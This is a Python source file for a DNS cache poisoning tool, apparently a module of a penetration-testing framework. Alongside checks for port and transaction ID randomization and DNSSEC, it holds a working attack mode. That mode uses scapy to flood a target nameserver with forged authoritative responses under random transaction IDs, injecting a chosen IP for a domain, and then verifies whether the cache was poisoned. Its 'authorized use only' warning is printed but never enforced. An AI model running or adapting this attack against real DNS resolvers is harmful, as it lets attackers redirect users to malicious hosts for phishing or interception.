#!/usr/bin/env python3
"""
DNS Cache Poisoning Detection and Testing Tool

Tests DNS servers for cache poisoning vulnerabilities and can attempt cache poisoning attacks
for authorized security testing.
"""

import socket
import sys
import random
import threading
import time
import argparse
import logging
import json
import os
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Union
import signal

try:
    from .base_tool import BaseTool, ToolResult
except ImportError:
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from tools.base_tool import BaseTool, ToolResult

# Check for scapy
try:
    from scapy.all import *
    from scapy.layers.dns import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def handle_interrupt(signum, frame):
    """Handle interrupt signal (Ctrl+C)"""
    print("\n[!] Interrupted by user")
    sys.exit(0)

# Register signal handler
signal.signal(signal.SIGINT, handle_interrupt)

class DNSCachePoisonScanner(BaseTool):
    """DNS Cache Poisoning Detection and Testing Tool"""
    
    def __init__(self):
        super().__init__(
            name="cache-poison",
            description="DNS cache poisoning detection and testing tool"
        )
        self.target_domain = None
        self.nameserver = None
        self.spoofed_ip = None
        self.record_type = 'A'
        self.mode = 'detect'
        self.duration = 30
        self.max_attempts = 1000
        self.threads = 10
        self.transaction_id = random.randint(0, 65535)
        self.query_port = random.randint(1024, 65535)
        self.requires_root = True
        
        # Results storage
        self.scan_results = {
            'status': 'initialized',
            'target_domain': '',
            'nameserver': '',
            'record_type': '',
            'timestamp': datetime.now().isoformat(),
            'vulnerability_checks': [],
            'poisoning_attempts': [],
            'success_rate': 0.0,
            'summary': {
                'is_vulnerable': False,
                'vulnerabilities_found': [],
                'successful_poisoning': False,
                'risk_level': 'Unknown'
            }
        }

    def setup_argparse(self, parser: argparse.ArgumentParser) -> None:
        """Set up argument parsing"""
        parser.add_argument('target', help='Target domain to poison')
        parser.add_argument('nameserver', help='DNS server to attack')
        parser.add_argument('spoofed_ip', help='IP address to inject')
        parser.add_argument('--record-type', choices=['A', 'AAAA', 'MX'], default='A',
                          help='DNS record type to poison')
        parser.add_argument('--mode', choices=['detect', 'poison', 'both'], 
                          default='detect', help='Operation mode')
        parser.add_argument('--duration', type=int, default=30,
                          help='Duration of poisoning attempt in seconds')
        parser.add_argument('--max-attempts', type=int, default=1000,
                          help='Maximum number of poisoning attempts')
        parser.add_argument('--threads', type=int, default=10,
                          help='Number of parallel threads for poisoning')
        
        # Framework integration arguments
        parser.add_argument('--output', help='Output file path for results')
        parser.add_argument('--framework-mode', action='store_true',
                          help='Run in framework integration mode')

    def run(self, args: argparse.Namespace) -> ToolResult:
        """Execute the tool with the given arguments"""
        result = ToolResult(
            success=True,
            tool_name=self.name,
            findings=[],
            metadata={
                'target_domain': args.target,
                'nameserver': args.nameserver,
                'record_type': args.record_type,
                'mode': args.mode,
                'timestamp': datetime.now().isoformat(),
                'framework_mode': args.framework_mode if hasattr(args, 'framework_mode') else False
            }
        )
        
        try:
            # Store arguments
            self.target_domain = args.target
            self.nameserver = args.nameserver
            self.spoofed_ip = args.spoofed_ip
            self.record_type = args.record_type
            self.mode = args.mode
            self.duration = args.duration
            self.max_attempts = args.max_attempts
            self.threads = args.threads
            
            # Check dependencies
            deps_ok, error_msg = self.check_dependencies()
            if not deps_ok:
                result.add_error(error_msg)
                return result
            
            # Display warning if not in framework mode
            if not hasattr(args, 'framework_mode') or not args.framework_mode:
                print("""
                [!] WARNING: This tool is for educational purposes only.
                [!] Unauthorized DNS cache poisoning attempts are illegal.
                [!] Use only on systems you have permission to test.
                """)
            
            # Check permissions
            if not self._check_admin():
                result.add_error("This script requires administrator/root privileges")
                return result
            
            # Run in appropriate mode
            if self.mode in ['detect', 'both']:
                vulnerable, message = self.detect_vulnerability()
                if vulnerable:
                    result.add_finding(
                        title=f"DNS Server {self.nameserver} Vulnerable to Cache Poisoning",
                        description=message,
                        risk_level="High",
                        evidence=json.dumps(self.scan_results['vulnerability_checks'], indent=2)
                    )
                else:
                    result.add_finding(
                        title=f"DNS Server {self.nameserver} Not Vulnerable",
                        description=message,
                        risk_level="Info",
                        evidence=json.dumps(self.scan_results['vulnerability_checks'], indent=2)
                    )
            
            if self.mode in ['poison', 'both']:
                if self.mode == 'both' and not self.scan_results['summary']['is_vulnerable']:
                    result.add_warning("Server appears not vulnerable, but proceeding with poisoning attempt as requested...")
                
                poisoning_success = self.poison_cache(
                    duration=self.duration,
                    max_attempts=self.max_attempts,
                    max_workers=self.threads
                )
                
                if poisoning_success:
                    result.add_finding(
                        title=f"DNS Cache Poisoning Successful on {self.nameserver}",
                        description=f"Successfully poisoned cache for {self.target_domain} with {self.spoofed_ip}",
                        risk_level="Critical",
                        evidence=json.dumps(self.scan_results['poisoning_attempts'], indent=2)
                    )
                else:
                    result.add_finding(
                        title=f"DNS Cache Poisoning Failed on {self.nameserver}",
                        description="Unable to poison DNS cache after multiple attempts",
                        risk_level="Info",
                        evidence=json.dumps(self.scan_results['poisoning_attempts'], indent=2)
                    )
            
            # Add risk summary for framework integration
            if hasattr(args, 'framework_mode') and args.framework_mode:
                risk_summary = {
                    'Critical': 0,
                    'High': 0,
                    'Medium': 0,
                    'Low': 0,
                    'Info': 0
                }
                for finding in result.findings:
                    risk_summary[finding.get('risk_level', 'Info')] += 1
                result.metadata['risk_summary'] = risk_summary
            
            # Handle output file if specified
            if hasattr(args, 'output') and args.output:
                try:
                    output_dir = os.path.dirname(args.output)
                    if output_dir and not os.path.exists(output_dir):
                        os.makedirs(output_dir)
                    
                    with open(args.output, 'w') as f:
                        json.dump(result.to_dict(), f, indent=2)
                except Exception as e:
                    result.add_error(f"Error writing output file: {str(e)}")
            
            return result
            
        except Exception as e:
            result.success = False
            result.add_error(f"Error during cache poisoning: {str(e)}")
            return result

    def check_dependencies(self) -> Tuple[bool, Optional[str]]:
        """Check if required dependencies are available"""
        if not SCAPY_AVAILABLE:
            return False, "Scapy is required for DNS packet manipulation"
        return True, None

    def _check_admin(self):
        """Check if the script has admin/root privileges"""
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:  # Unix/Linux/macOS
                return os.geteuid() == 0
        except:
            return False

    def generate_dns_query(self, qtype='A'):
        """Generate a DNS query packet with specified record type"""
        return IP(dst=self.nameserver)/\
               UDP(sport=self.query_port, dport=53)/\
               DNS(rd=1, id=self.transaction_id,
                   qd=DNSQR(qname=self.target_domain, qtype=qtype))
    
    def generate_spoofed_response(self, qtype='A'):
        """Generate a spoofed DNS response packet"""
        response = IP(dst=self.nameserver)/\
                  UDP(sport=53, dport=self.query_port)/\
                  DNS(id=self.transaction_id,
                      qr=1,  # Response
                      aa=1,  # Authoritative
                      rd=1,  # Recursion Desired
                      ra=1,  # Recursion Available
                      qd=DNSQR(qname=self.target_domain, qtype=qtype))

        # Add appropriate resource record based on type
        if qtype == 'A':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='A',
                ttl=3600,
                rdata=self.spoofed_ip
            )
        elif qtype == 'AAAA':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='AAAA',
                ttl=3600,
                rdata=self.spoofed_ip
            )
        elif qtype == 'MX':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='MX',
                ttl=3600,
                rdata=f"10 mail.{self.target_domain}"
            )
        
        return response

    def check_source_port_randomization(self, num_queries=10):
        """Test if the DNS server uses random source ports"""
        if self.framework_mode:
            self.logger.info("Testing source port randomization...")
        else:
            print("[*] Testing source port randomization...")
            
        ports = set()
        
        for _ in range(num_queries):
            try:
                query = self.generate_dns_query()
                reply = sr1(query, timeout=2, verbose=0)
                if reply and UDP in reply:
                    ports.add(reply[UDP].sport)
                time.sleep(0.5)
            except Exception as e:
                self.logger.warning(f"Error during port randomization check: {str(e)}")
        
        port_randomization = len(ports) > num_queries * 0.8
        check_result = {
            'check': 'source_port_randomization',
            'vulnerable': not port_randomization,
            'details': f"Unique ports observed: {len(ports)}/{num_queries}",
            'risk_level': 'High' if not port_randomization else 'Low'
        }
        self.scan_results['vulnerability_checks'].append(check_result)
        
        if not port_randomization:
            self.scan_results['summary']['vulnerabilities_found'].append('Predictable source ports')
            if self.scan_results['summary']['risk_level'] != 'Critical':
                self.scan_results['summary']['risk_level'] = 'High'
        
        return not port_randomization

    def check_txid_randomization(self, num_queries=10):
        """Test if the DNS server uses random transaction IDs"""
        if self.framework_mode:
            self.logger.info("Testing transaction ID randomization...")
        else:
            print("[*] Testing transaction ID randomization...")
            
        txids = set()
        
        for _ in range(num_queries):
            try:
                query = self.generate_dns_query()
                reply = sr1(query, timeout=2, verbose=0)
                if reply and DNS in reply:
                    txids.add(reply[DNS].id)
                time.sleep(0.5)
            except Exception as e:
                self.logger.warning(f"Error during TXID randomization check: {str(e)}")
        
        txid_randomization = len(txids) > num_queries * 0.8
        check_result = {
            'check': 'txid_randomization',
            'vulnerable': not txid_randomization,
            'details': f"Unique TXIDs observed: {len(txids)}/{num_queries}",
            'risk_level': 'High' if not txid_randomization else 'Low'
        }
        self.scan_results['vulnerability_checks'].append(check_result)
        
        if not txid_randomization:
            self.scan_results['summary']['vulnerabilities_found'].append('Predictable transaction IDs')
            if self.scan_results['summary']['risk_level'] != 'Critical':
                self.scan_results['summary']['risk_level'] = 'High'
        
        return not txid_randomization

    def detect_vulnerability(self):
        """Enhanced vulnerability detection with multiple checks"""
        if self.framework_mode:
            self.logger.info(f"Testing {self.nameserver} for DNS cache poisoning vulnerabilities...")
        else:
            print(f"[*] Testing {self.nameserver} for DNS cache poisoning vulnerabilities...")
        
        vulnerabilities = []
        
        # Check source port randomization
        if self.check_source_port_randomization():
            vulnerabilities.append("Predictable source ports")
            
        # Check transaction ID randomization
        if self.check_txid_randomization():
            vulnerabilities.append("Predictable transaction IDs")
            
        # Check for DNSSEC
        try:
            query = self.generate_dns_query()
            reply = sr1(query, timeout=2, verbose=0)
            has_dnssec = False
            
            if reply and DNS in reply:
                if reply[DNS].ar and any(rr.type == 46 for rr in reply[DNS].ar):
                    has_dnssec = True
            
            check_result = {
                'check': 'dnssec',
                'vulnerable': not has_dnssec,
                'details': "DNSSEC not implemented",
                'risk_level': 'Medium' if not has_dnssec else 'Low'
            }
            self.scan_results['vulnerability_checks'].append(check_result)
            
            if not has_dnssec:
                vulnerabilities.append("No DNSSEC protection")
                if self.scan_results['summary']['risk_level'] == 'Unknown':
                    self.scan_results['summary']['risk_level'] = 'Medium'
        except Exception as e:
            self.logger.warning(f"Error during DNSSEC check: {str(e)}")
        
        # Update summary
        self.scan_results['summary']['is_vulnerable'] = bool(vulnerabilities)
        if vulnerabilities:
            self.scan_results['summary']['vulnerabilities_found'].extend(
                [v for v in vulnerabilities if v not in self.scan_results['summary']['vulnerabilities_found']]
            )
        
        return bool(vulnerabilities), ", ".join(vulnerabilities) if vulnerabilities else "No obvious vulnerabilities detected"

    def poison_worker(self, attempt_id):
        """Worker function for parallel poisoning attempts"""
        try:
            legitimate_query = self.generate_dns_query(self.record_type)
            send(legitimate_query, verbose=0)
            
            # Send multiple spoofed responses with different transaction IDs
            for _ in range(50):
                self.transaction_id = random.randint(0, 65535)
                spoofed_response = self.generate_spoofed_response(self.record_type)
                send(spoofed_response, verbose=0)
            
            return attempt_id
        except Exception as e:
            self.logger.warning(f"Error in poisoning worker {attempt_id}: {str(e)}")
            return None

    def poison_cache(self, duration=30, max_attempts=1000, max_workers=10):
        """Enhanced cache poisoning with parallel processing"""
        if self.framework_mode:
            self.logger.info(f"Attempting cache poisoning attack on {self.nameserver}")
            self.logger.info(f"Target domain: {self.target_domain}")
            self.logger.info(f"Spoofed IP: {self.spoofed_ip}")
            self.logger.info(f"Record type: {self.record_type}")
        else:
            print(f"[*] Attempting cache poisoning attack on {self.nameserver}")
            print(f"[*] Target domain: {self.target_domain}")
            print(f"[*] Spoofed IP: {self.spoofed_ip}")
            print(f"[*] Record type: {self.record_type}")
        
        start_time = time.time()
        successful_attempts = 0
        total_attempts = 0
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                while time.time() - start_time < duration and total_attempts < max_attempts:
                    futures.append(
                        executor.submit(self.poison_worker, total_attempts)
                    )
                    total_attempts += 1
                    
                    # Process completed attempts
                    for future in as_completed(futures):
                        attempt_id = future.result()
                        if attempt_id is None:
                            continue
                        
                        # Verify if poisoning was successful
                        try:
                            verify_query = self.generate_dns_query(self.record_type)
                            reply = sr1(verify_query, timeout=2, verbose=0)
                            
                            if reply and DNS in reply and reply[DNS].an:
                                for rr in reply[DNS].an:
                                    if rr.rdata == self.spoofed_ip:
                                        successful_attempts += 1
                                        if self.framework_mode:
                                            self.logger.info(f"Successful poisoning detected! (Attempt {attempt_id})")
                                        else:
                                            print(f"[+] Successful poisoning detected! (Attempt {attempt_id})")
                            
                            if total_attempts % 10 == 0:
                                if self.framework_mode:
                                    self.logger.info(f"Made {total_attempts} attempts, {successful_attempts} successful...")
                                else:
                                    print(f"[*] Made {total_attempts} attempts, {successful_attempts} successful...")
                        except Exception as e:
                            self.logger.warning(f"Error verifying attempt {attempt_id}: {str(e)}")
                        
                        time.sleep(0.1)
        
        except KeyboardInterrupt:
            self.logger.warning("Attack interrupted by user")
        except Exception as e:
            self.logger.error(f"Error during poisoning attack: {str(e)}")
        
        # Calculate success rate
        success_rate = (successful_attempts / total_attempts * 100) if total_attempts > 0 else 0
        attempt_result = {
            'total_attempts': total_attempts,
            'successful_attempts': successful_attempts,
            'success_rate': success_rate,
            'duration': time.time() - start_time
        }
        self.scan_results['poisoning_attempts'].append(attempt_result)
        
        # Update summary
        self.scan_results['success_rate'] = success_rate
        self.scan_results['summary']['successful_poisoning'] = successful_attempts > 0
        
        if successful_attempts > 0:
            self.scan_results['summary']['risk_level'] = 'Critical'
        
        # Update status
        self.scan_results['status'] = 'completed'
        
        # Log completion
        if self.framework_mode:
            self.logger.info(f"Attack completed after {total_attempts} attempts")
            self.logger.info(f"Success rate: {success_rate:.2f}%")
        else:
            print(f"[+] Attack completed after {total_attempts} attempts")
            print(f"[+] Success rate: {success_rate:.2f}%")
        
        return successful_attempts > 0

def main():
    """Main function for standalone usage"""
    tool = DNSCachePoisonScanner()
    parser = argparse.ArgumentParser(description=tool.description)
    tool.setup_argparse(parser)
    args = parser.parse_args()
    
    result = tool.run(args)
    
    if args.output:
        print(f"Results written to {args.output}")
    else:
        print(json.dumps(result.to_dict(), indent=2))
    
    sys.exit(0 if result.success else 1)

if __name__ == "__main__":
    main() 